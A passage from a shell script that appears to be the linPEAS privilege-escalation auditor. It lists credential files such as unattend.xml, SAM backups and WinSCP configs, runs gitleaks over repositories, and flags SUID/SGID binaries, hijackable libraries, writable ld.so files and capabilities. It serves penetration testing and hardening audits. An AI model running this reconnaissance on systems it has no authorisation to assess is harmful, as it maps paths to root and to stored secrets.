    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"server\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "server.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "server\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,server\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"setupinfo$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "setupinfo"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "setupinfo$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,setupinfo$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"setupinfo\.bak$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "setupinfo.bak"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "setupinfo\.bak$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,setupinfo\.bak$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"sitemanager\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sitemanager.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "sitemanager\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sitemanager\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"sites\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sites.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "sites\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sites\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"software$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "software"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "software$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,software$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"software\.sav$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "software.sav"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "software\.sav$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,software\.sav$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"sysprep\.inf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sysprep.inf"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "sysprep\.inf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sysprep\.inf$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"sysprep\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sysprep.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "sysprep\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sysprep\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"system\.sav$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "system.sav"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "system\.sav$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,system\.sav$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"unattend\.inf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "unattend.inf"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "unattend\.inf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,unattend\.inf$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"unattend\.txt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "unattend.txt"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "unattend\.txt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,unattend\.txt$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"unattend\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "unattend.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "unattend\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,unattend\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"unattended\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "unattended.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "unattended\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,unattended\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"wcx_ftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "wcx_ftp.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "wcx_ftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,wcx_ftp\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"ws_ftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ws_ftp.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "ws_ftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ws_ftp\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"web.*\.config$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "web*.config"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "web.*\.config$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,web.*\.config$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"winscp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "winscp.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "winscp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,winscp\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"wsl\.exe$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "wsl.exe"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "wsl\.exe$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,wsl\.exe$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"plum\.sqlite$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "plum.sqlite"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "plum\.sqlite$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,plum\.sqlite$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_OTHER_INTERESTING" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Other Interesting Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.bashrc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".bashrc"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.bashrc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.bashrc$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.google_authenticator$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".google_authenticator"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.google_authenticator$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.google_authenticator$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"hosts\.equiv$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "hosts.equiv"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "hosts\.equiv$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,hosts\.equiv$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.lesshst$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".lesshst"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.lesshst$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.lesshst$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.plan$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".plan"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.plan$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.plan$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.profile$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".profile"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.profile$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.profile$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.recently-used\.xbel$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".recently-used.xbel"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.recently-used\.xbel$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.recently-used\.xbel$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.rhosts$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".rhosts"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.rhosts$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.rhosts$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.sudo_as_admin_successful$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".sudo_as_admin_successful"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.sudo_as_admin_successful$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.sudo_as_admin_successful$,${SED_RED},"; done; echo "";
fi


if ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ]; then
  print_2title "Checking leaks in git repositories"
  printf "%s\n" "$PSTORAGE_GITHUB" | while read f; do
    if echo "$f" | grep -Eq ".git$"; then
      git_dirname=$(dirname "$f")
      if [ "$MACPEAS" ]; then
        execBin "GitLeaks (checking $git_dirname)" "https://github.com/zricethezav/gitleaks" "$FAT_LINPEAS_GITLEAKS_MACOS" "detect -s '$git_dirname' -v | grep -E 'Description|Match|Secret|Message|Date'"
      else
        execBin "GitLeaks (checking $git_dirname)" "https://github.com/zricethezav/gitleaks" "$FAT_LINPEAS_GITLEAKS_LINUX" "detect -s '$git_dirname' -v | grep -E 'Description|Match|Secret|Message|Date'"
      fi
    fi
  done
fi

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q interesting_perms_files; then
print_title "Files with Interesting Permissions"
###########################################
#-) Files with Interesting Permissions  (-#
###########################################

check_critial_root_path(){
  folder_path="$1"
  if [ -w "$folder_path" ]; then echo "You have write privileges over $folder_path" | sed -${E} "s,.*,${SED_RED_YELLOW},"; fi
  if [ "$(find $folder_path -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null)" ]; then echo "You have write privileges over $(find $folder_path -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')')" | sed -${E} "s,.*,${SED_RED_YELLOW},"; fi
  if [ "$(find $folder_path -type f -not -user root 2>/dev/null)" ]; then echo "The following files aren't owned by root: $(find $folder_path -type f -not -user root 2>/dev/null)"; fi
}




##-- IPF) SUID
print_2title "SUID - Check easy privesc, exploits and write perms"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid"
if ! [ "$STRINGS" ]; then
  echo_not_found "strings"
fi
if ! [ "$STRACE" ]; then
  echo_not_found "strace"
fi
suids_files=$(find $ROOT_FOLDER -perm -4000 -type f ! -path "/dev/*" 2>/dev/null)
for s in $suids_files; do
  s=$(ls -lahtr "$s")
  # If starts like "total 332K" then no SUID bin was found and xargs just executed "ls" in the current folder
  if echo "$s" | grep -qE "^total"; then break; fi

  sname="$(echo $s | awk '{print $9}')"
  if [ "$sname" = "."  ] || [ "$sname" = ".."  ]; then
    true # Don't do nothing
  elif ! [ "$IAMROOT" ] && [ -O "$sname" ]; then
    echo "You own the SUID file: $sname" | sed -${E} "s,.*,${SED_RED},"
  elif ! [ "$IAMROOT" ] && [ -w "$sname" ]; then # If write permision, win found (no check exploits)
    echo "You can write SUID file: $sname" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  else
    c="a"
    for b in $sidB; do
      if echo $s | grep -q $(echo $b | cut -d % -f 1); then
        echo "$s" | sed -${E} "s,$(echo $b | cut -d % -f 1),${C}[1;31m&  --->  $(echo $b | cut -d % -f 2)${C}[0m,"
        c=""
        break;
      fi
    done;
    if [ "$c" ]; then
      if echo "$s" | grep -qE "$sidG1" || echo "$s" | grep -qE "$sidG2" || echo "$s" | grep -qE "$sidG3" || echo "$s" | grep -qE "$sidG4" || echo "$s" | grep -qE "$sidVB" || echo "$s" | grep -qE "$sidVB2"; then
        echo "$s" | sed -${E} "s,$sidG1,${SED_GREEN}," | sed -${E} "s,$sidG2,${SED_GREEN}," | sed -${E} "s,$sidG3,${SED_GREEN}," | sed -${E} "s,$sidG4,${SED_GREEN}," | sed -${E} "s,$sidVB,${SED_RED_YELLOW}," | sed -${E} "s,$sidVB2,${SED_RED_YELLOW},"
      else
        echo "$s (Unknown SUID binary!)" | sed -${E} "s,/.*,${SED_RED},"
        printf $ITALIC
        if ! [ "$FAST" ]; then
          
          if [ "$STRINGS" ]; then
            $STRINGS "$sname" 2>/dev/null | sort | uniq | while read sline; do
              sline_first="$(echo "$sline" | cut -d ' ' -f1)"
              if echo "$sline_first" | grep -qEv "$cfuncs"; then
                if echo "$sline_first" | grep -q "/" && [ -f "$sline_first" ]; then # If a path
                  if [ -O "$sline_first" ] || [ -w "$sline_first" ]; then # And modifiable
                    printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is using $RED$sline_first$NC$ITALIC and you can modify it (strings line: $sline) (https://tinyurl.com/suidpath)\n"
                  fi
                else #If not a path
                  if [ ${#sline_first} -gt 2 ] && command -v "$sline_first" 2>/dev/null | grep -q '/' && echo "$sline_first" | grep -Eqv "\.\."; then # Check if existing binary
                    printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is executing $RED$sline_first$NC$ITALIC and you can impersonate it (strings line: $sline) (https://tinyurl.com/suidpath)\n"
                  fi
                fi
              fi
            done
          fi

          if [ "$LDD" ] || [ "$READELF" ]; then
            echo "$ITALIC  --- Checking for writable dependencies of $sname...$NC"
          fi
          if [ "$LDD" ]; then
            "$LDD" "$sname" | grep -E "$Wfolders" | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"
          fi
          if [ "$READELF" ]; then
            "$READELF" -d "$sname" | grep PATH | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"
          fi
          
          if [ "$TIMEOUT" ] && [ "$STRACE" ] && ! [ "$NOTEXPORT" ] && [ -x "$sname" ]; then
            printf $ITALIC
            echo "----------------------------------------------------------------------------------------"
            echo "  --- Trying to execute $sname with strace in order to look for hijackable libraries..."
            OLD_LD_LIBRARY_PATH=$LD_LIBRARY_PATH
            export LD_LIBRARY_PATH=""
            timeout 2 "$STRACE" "$sname" 2>&1 | grep -i -E "open|access|no such file" | sed -${E} "s,open|access|No such file,${SED_RED}$ITALIC,g"
            printf $NC
            export LD_LIBRARY_PATH=$OLD_LD_LIBRARY_PATH
            echo "----------------------------------------------------------------------------------------"
            echo ""
          fi
        
        fi
      fi
    fi
  fi
done;
echo ""


##-- IPF) SGID
print_2title "SGID"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid"
sgids_files=$(find $ROOT_FOLDER -perm -2000 -type f ! -path "/dev/*" 2>/dev/null)
for s in $sgids_files; do
  s=$(ls -lahtr "$s")
  # If starts like "total 332K" then no SUID bin was found and xargs just executed "ls" in the current folder
  if echo "$s" | grep -qE "^total";then break; fi

  sname="$(echo $s | awk '{print $9}')"
  if [ "$sname" = "."  ] || [ "$sname" = ".."  ]; then
    true #Don't do nothing
  elif ! [ "$IAMROOT" ] && [ -O "$sname" ]; then
    echo "You own the SGID file: $sname" | sed -${E} "s,.*,${SED_RED},"
  elif ! [ "$IAMROOT" ] && [ -w "$sname" ]; then # If write permision, win found (no check exploits)
    echo "You can write SGID file: $sname" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  else
    c="a"
    for b in $sidB; do
      if echo "$s" | grep -q $(echo $b | cut -d % -f 1); then
        echo "$s" | sed -${E} "s,$(echo $b | cut -d % -f 1),${C}[1;31m&  --->  $(echo $b | cut -d % -f 2)${C}[0m,"
        c=""
        break;
      fi
    done;
    if [ "$c" ]; then
      if echo "$s" | grep -qE "$sidG1" || echo "$s" | grep -qE "$sidG2" || echo "$s" | grep -qE "$sidG3" || echo "$s" | grep -qE "$sidG4" || echo "$s" | grep -qE "$sidVB" || echo "$s" | grep -qE "$sidVB2"; then
        echo "$s" | sed -${E} "s,$sidG1,${SED_GREEN}," | sed -${E} "s,$sidG2,${SED_GREEN}," | sed -${E} "s,$sidG3,${SED_GREEN}," | sed -${E} "s,$sidG4,${SED_GREEN}," | sed -${E} "s,$sidVB,${SED_RED_YELLOW}," | sed -${E} "s,$sidVB2,${SED_RED_YELLOW},"
      else
        echo "$s (Unknown SGID binary)" | sed -${E} "s,/.*,${SED_RED},"
        printf $ITALIC
        if ! [ "$FAST" ]; then
        
          if [ "$STRINGS" ]; then
            $STRINGS "$sname" | sort | uniq | while read sline; do
              sline_first="$(echo $sline | cut -d ' ' -f1)"
              if echo "$sline_first" | grep -qEv "$cfuncs"; then
                if echo "$sline_first" | grep -q "/" && [ -f "$sline_first" ]; then # If a path
                  if [ -O "$sline_first" ] || [ -w "$sline_first" ]; then # And modifiable
                    printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is using $RED$sline_first$NC$ITALIC and you can modify it (strings line: $sline)\n"
                  fi
                else # If not a path
                  if [ ${#sline_first} -gt 2 ] && command -v "$sline_first" 2>/dev/null | grep -q '/'; then # Check if existing binary
                    printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is executing $RED$sline_first$NC$ITALIC and you can impersonate it (strings line: $sline)\n"
                  fi
                fi
              fi
            done
          fi

          if [ "$LDD" ] || [ "$READELF" ]; then
            echo "$ITALIC  --- Checking for writable dependencies of $sname...$NC"
          fi
          if [ "$LDD" ]; then
            "$LDD" "$sname" | grep -E "$Wfolders" | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"
          fi
          if [ "$READELF" ]; then
            "$READELF" -d "$sname" | grep PATH | grep -E "$Wfolders" | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"
          fi
            
          if [ "$TIMEOUT" ] && [ "$STRACE" ] && [ ! "$SUPERFAST" ]; then
            printf "$ITALIC"
            echo "  --- Trying to execute $sname with strace in order to look for hijackable libraries..."
            timeout 2 "$STRACE" "$sname" 2>&1 | grep -i -E "open|access|no such file" | sed -${E} "s,open|access|No such file,${SED_RED}$ITALIC,g"
            printf "$NC"
            echo ""
          fi
        
        fi
      fi
    fi
  fi
done;
echo ""

##-- IPF) Misconfigured ld.so
if ! [ "$SEARCH_IN_FOLDER" ] && ! [ "$IAMROOT" ]; then
  print_2title "Checking misconfigurations of ld.so"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so"
  if [ -f "/etc/ld.so.conf" ] && [ -w "/etc/ld.so.conf" ]; then 
    echo "You have write privileges over /etc/ld.so.conf" | sed -${E} "s,.*,${SED_RED_YELLOW},"; 
    printf $RED$ITALIC"/etc/ld.so.conf\n"$NC;
  else
    printf $GREEN$ITALIC"/etc/ld.so.conf\n"$NC;
  fi

  echo "Content of /etc/ld.so.conf:"
  cat /etc/ld.so.conf 2>/dev/null | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"

  # Check each configured folder
  cat /etc/ld.so.conf 2>/dev/null | while read l; do
    if echo "$l" | grep -q include; then
      ini_path=$(echo "$l" | cut -d " " -f 2)
      fpath=$(dirname "$ini_path")

      if [ -d "/etc/ld.so.conf" ] && [ -w "$fpath" ]; then 
        echo "You have write privileges over $fpath" | sed -${E} "s,.*,${SED_RED_YELLOW},"; 
        printf $RED_YELLOW$ITALIC"$fpath\n"$NC;
      else
        printf $GREEN$ITALIC"$fpath\n"$NC;
      fi

      if [ "$(find $fpath -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null)" ]; then
        echo "You have write privileges over $(find $fpath -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null)" | sed -${E} "s,.*,${SED_RED_YELLOW},"; 
      fi

      for f in $fpath/*; do
        if [ -w "$f" ]; then 
          echo "You have write privileges over $f" | sed -${E} "s,.*,${SED_RED_YELLOW},"; 
          printf $RED_YELLOW$ITALIC"$f\n"$NC;
        else
          printf $GREEN$ITALIC"  $f\n"$NC;
        fi

        cat "$f" | grep -v "^#" | while read l2; do
          if [ -f "$l2" ] && [ -w "$l2" ]; then 
            echo "You have write privileges over $l2" | sed -${E} "s,.*,${SED_RED_YELLOW},"; 
            printf $RED_YELLOW$ITALIC"  - $l2\n"$NC;
          else
            echo $ITALIC"  - $l2"$NC | sed -${E} "s,$l2,${SED_GREEN}," | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g";
          fi
        done
      done
    fi
  done
  echo ""


  if [ -f "/etc/ld.so.preload" ] && [ -w "/etc/ld.so.preload" ]; then 
    echo "You have write privileges over /etc/ld.so.preload" | sed -${E} "s,.*,${SED_RED_YELLOW},"; 
  else
    printf $ITALIC$GREEN"/etc/ld.so.preload\n"$NC;
  fi
  cat /etc/ld.so.preload 2>/dev/null | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"
  cat /etc/ld.so.preload 2>/dev/null | while read l; do
    if [ -f "$l" ] && [ -w "$l" ]; then echo "You have write privileges over $l" | sed -${E} "s,.*,${SED_RED_YELLOW},"; fi
  done

fi

##-- IPF) Capabilities
if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Capabilities"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities"
  if [ "$(command -v capsh)" ]; then

    print_3title "Current shell capabilities"
    cat "/proc/$$/status" | grep Cap | while read -r cap_line; do
      cap_name=$(echo "$cap_line" | awk '{print $1}')
      cap_value=$(echo "$cap_line" | awk '{print $2}')
      if [ "$cap_name" = "CapEff:" ]; then
        echo "$cap_name	 $(capsh --decode=0x"$cap_value" | sed -${E} "s,$capsB,${SED_RED_YELLOW},")"
      else
        echo "$cap_name  $(capsh --decode=0x"$cap_value" | sed -${E} "s,$capsB,${SED_RED},")"
      fi
    done
    echo ""

    print_3title "Parent process capabilities"
    cat "/proc/$PPID/status" | grep Cap | while read -r cap_line; do
      cap_name=$(echo "$cap_line" | awk '{print $1}')
      cap_value=$(echo "$cap_line" | awk '{print $2}')
      if [ "$cap_name" = "CapEff:" ]; then
        echo "$cap_name	 $(capsh --decode=0x"$cap_value" | sed -${E} "s,$capsB,${SED_RED_YELLOW},")"
      else
        echo "$cap_name	 $(capsh --decode=0x"$cap_value" | sed -${E} "s,$capsB,${SED_RED},")"
      fi
    done
    echo ""
  
  else
    print_3title "Current shell capabilities"
    (cat "/proc/$$/status" | grep Cap | sed -${E} "s,.*0000000000000000|CapBnd:	0000003fffffffff,${SED_GREEN},") 2>/dev/null || echo_not_found "/proc/$$/status"
    echo ""
    
    print_3title "Parent proc capabilities"
    (cat "/proc/$PPID/status" | grep Cap | sed -${E} "s,.*0000000000000000|CapBnd:	0000003fffffffff,${SED_GREEN},") 2>/dev/null || echo_not_found "/proc/$PPID/status"
    echo ""
  fi
  echo ""
  echo "Files with capabilities (limited to 50):"
  getcap -r / 2>/dev/null | head -n 50 | while read cb; do
    capsVB_vuln=""
    
    for capVB in $capsVB; do
      capname="$(echo $capVB | cut -d ':' -f 1)"
      capbins="$(echo $capVB | cut -d ':' -f 2)"
      if [ "$(echo $cb | grep -Ei $capname)" ] && [ "$(echo $cb | grep -E $capbins)" ]; then
        echo "$cb" | sed -${E} "s,.*,${SED_RED_YELLOW},"
        capsVB_vuln="1"
        break
      fi
    done
    
    if ! [ "$capsVB_vuln" ]; then
      echo "$cb" | sed -${E} "s,$capsB,${SED_RED},"
    fi

    if ! [ "$IAMROOT" ] && [ -w "$(echo $cb | cut -d" " -f1)" ]; then
      echo "$cb is writable" | sed -${E} "s,.*,${SED_RED},"
    fi
  done
  echo ""
fi

##-- IPF) Users with capabilities
if [ -f "/etc/security/capability.conf" ] || [ "$DEBUG" ]; then
  print_2title "Users with capabilities"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities"
  if [ -f "/etc/security/capability.conf" ]; then
    grep -v '^#\|none\|^$' /etc/security/capability.conf 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED},"
  else echo_not_found "/etc/security/capability.conf"
  fi
  echo ""
fi

##-- IPF) AppArmor profiles to prevent suid/capabilities abuse
if ! [ "$SEARCH_IN_FOLDER" ]; then
  if [ -d "/etc/apparmor.d/" ] && [ -r "/etc/apparmor.d/" ]; then
    print_2title "AppArmor binary profiles"
    ls -l /etc/apparmor.d/ 2>/dev/null | grep -E "^-" | grep "\."
    echo ""
  fi
fi

##-- IPF) Files with ACLs
print_2title "Files with ACLs (limited to 50)"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls"
if ! [ "$SEARCH_IN_FOLDER" ]; then
  ( (getfacl -t -s -R -p /bin /etc $HOMESEARCH /opt /sbin /usr /tmp /root 2>/dev/null) || echo_not_found "files with acls in searched folders" ) | head -n 70 | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED},"
else
  ( (getfacl -t -s -R -p $SEARCH_IN_FOLDER 2>/dev/null) || echo_not_found "files with acls in searched folders" ) | head -n 70 | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED},"
fi

if [ "$MACPEAS" ] && ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && ! [ "$(command -v getfacl)" ]; then  #Find ACL files in macos (veeeery slow)
  ls -RAle / 2>/dev/null | grep -v "group:everyone deny delete" | grep -E -B1 "\d: " | head -n 70 | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED},"
fi
echo ""

##-- IPF) Files with ResourceFork
#if [ "$MACPEAS" ] && ! [ "$FAST" ] && ! [ "$SUPERFAST" ]; then # TOO SLOW, CHECK IT LATER
#  print_2title "Files with ResourceFork"
#  print_info "https://book.hacktricks.xyz/macos/macos-security-and-privilege-escalation#resource-forks-or-macos-ads"
#  find $HOMESEARCH -type f -exec ls -ld {} \; 2>/dev/null | grep -E ' [x\-]@ ' | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.ResourceFork"
#fi
#echo ""

##-- IPF) Files (scripts) in /etc/profile.d/
if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Files (scripts) in /etc/profile.d/"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files"
  if [ ! "$MACPEAS" ] && ! [ "$IAMROOT" ]; then #Those folders don´t exist on a MacOS
    (ls -la /etc/profile.d/ 2>/dev/null | sed -${E} "s,$profiledG,${SED_GREEN},") || echo_not_found "/etc/profile.d/"
    check_critial_root_path "/etc/profile"
    check_critial_root_path "/etc/profile.d/"
  fi
  echo ""
fi

  ##-- IPF) Files (scripts) in /etc/init.d/
  if ! [ "$SEARCH_IN_FOLDER" ]; then
print_2title "Permissions in init, init.d, systemd, and rc.d"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d"
